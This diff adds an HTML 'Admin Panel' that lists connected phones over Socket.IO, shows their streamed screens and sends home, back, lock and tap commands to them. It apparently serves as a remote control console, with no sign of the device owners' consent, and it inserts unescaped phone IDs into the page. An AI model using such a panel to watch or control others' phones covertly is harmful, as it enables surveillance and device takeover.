@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Admin Panel</title>
+    <script src="https://cdn.socket.io/4.0.0/socket.io.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a1a;
+            color: #fff;
+            font-family: Arial;
+            display: flex;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        .sidebar {
+            width: 250px;
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 16px;
+            border: 1px solid #e94560;
+            margin-right: 20px;
+        }
+
+        .sidebar h2 {
+            color: #e94560;
+            margin-bottom: 15px;
+        }
+
+        .phone-item {
+            background: #0a0a1a;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 8px 0;
+            cursor: pointer;
+            border: 1px solid #333;
+        }
+
+        .phone-item:hover {
+            border-color: #e94560;
+        }
+
+        .phone-item.active {
+            border-color: #4caf50;
+            background: #1a2a1a;
+        }
+
+        .no-phone {
+            color: #666;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .main {
+            flex: 1;
+        }
+
+        .container {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 24px;
+            border: 1px solid #e94560;
+        }
+
+        h1 {
+            color: #e94560;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .screen-box {
+            background: #000;
+            border-radius: 12px;
+            padding: 10px;
+            min-height: 400px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .screen-box img {
+            max-width: 100%;
+            max-height: 500px;
+            display: none;
+            border-radius: 8px;
+        }
+
+        .placeholder {
+            color: #666;
+            text-align: center;
+            font-size: 16px;
+        }
+
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+
+        .controls button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            background: #2a2a4a;
+            color: #fff;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .controls button:hover {
+            background: #e94560;
+        }
+
+        .controls .danger {
+            background: #e94560;
+        }
+
+        .status {
+            text-align: center;
+            padding: 8px;
+            border-radius: 20px;
+            background: #ff4444;
+            color: #fff;
+            margin-bottom: 15px;
+        }
+
+        .status.connected {
+            background: #4caf50;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="sidebar">
+        <h2>📱 Connected Phones</h2>
+        <div id="phoneList">
+            <div class="no-phone">No phones connected</div>
+        </div>
+    </div>
+    <div class="main">
+        <div class="container">
+            <h1>📱 Admin Panel</h1>
+            <div class="status" id="status">🔴 Disconnected</div>
+            <div class="screen-box">
+                <img id="screen" src="">
+                <div class="placeholder" id="placeholder">📱 Select a phone to view</div>
+            </div>
+            <div class="controls">
+                <button onclick="sendCmd('home')">🏠 Home</button>
+                <button onclick="sendCmd('back')">⬅️ Back</button>
+                <button class="danger" onclick="sendCmd('lock')">🔒 Lock</button>
+            </div>
+            <div style="text-align:center;color:#888;font-size:13px;" id="info">No phone selected</div>
+        </div>
+    </div>
+
+    <script>
+        const socket = io();
+        let selectedPhone = null;
+        const statusEl = document.getElementById('status');
+        const screenImg = document.getElementById('screen');
+        const placeholder = document.getElementById('placeholder');
+        const infoEl = document.getElementById('info');
+        const phoneListEl = document.getElementById('phoneList');
+
+        socket.on('phone-list', (phones) => {
+            if (phones.length === 0) {
+                phoneListEl.innerHTML = '<div class="no-phone">No phones connected</div>';
+                return;
+            }
+            let html = '';
+            phones.forEach(id => {
+                const active = id === selectedPhone ? 'active' : '';
+                html += `<div class="phone-item ${active}" onclick="selectPhone('${id}')">📱 ${id}</div>`;
+            });
+            phoneListEl.innerHTML = html;
+        });
+
+        socket.on('admin-screen', ({ id, image }) => {
+            if (id === selectedPhone) {
+                screenImg.src = image;
+                screenImg.style.display = 'block';
+                placeholder.style.display = 'none';
+                statusEl.textContent = `🟢 Connected to ${id}`;
+                statusEl.className = 'status connected';
+            }
+        });
+
+        function selectPhone(id) {
+            selectedPhone = id;
+            infoEl.textContent = `Device: ${id}`;
+            placeholder.textContent = `📱 Loading ${id}...`;
+            screenImg.style.display = 'none';
+            placeholder.style.display = 'block';
+            document.querySelectorAll('.phone-item').forEach(el => {
+                el.classList.toggle('active', el.textContent.includes(id));
+            });
+        }
+
+        function sendCmd(action) {
+            if (!selectedPhone) { alert('Select a phone first!'); return; }
+            socket.emit('admin-command', selectedPhone, { type: 'system', action });
+        }
+
+        screenImg.onclick = function (e) {
+            if (!selectedPhone) return;
+            const rect = screenImg.getBoundingClientRect();
+            const x = ((e.clientX - rect.left) / rect.width * 100).toFixed(0);
+            const y = ((e.clientY - rect.top) / rect.height * 100).toFixed(0);
+            socket.emit('admin-command', selectedPhone, { type: 'click', x, y });
+        };
+    </script>
+</body>
+
+</html>
